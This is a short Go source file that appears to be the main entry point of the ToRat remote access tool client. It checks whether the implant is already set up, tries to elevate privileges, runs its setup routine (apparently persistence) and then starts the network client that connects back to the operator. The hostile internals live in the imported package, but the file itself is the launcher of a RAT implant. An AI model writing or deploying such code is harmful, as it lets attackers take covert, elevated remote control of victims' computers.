package main

import (
	"os"

	client "github.com/lu4p/ToRat/torat_client"
)

func main() {
	for {
		if client.CheckSetup() {
			break
		}
		if client.CheckElevate() {
			client.Setup()
			break
		}
		if client.Elevate() == nil {
			os.Exit(0)
		}
		client.Setup()
		break

	}
	client.NetClient()
}
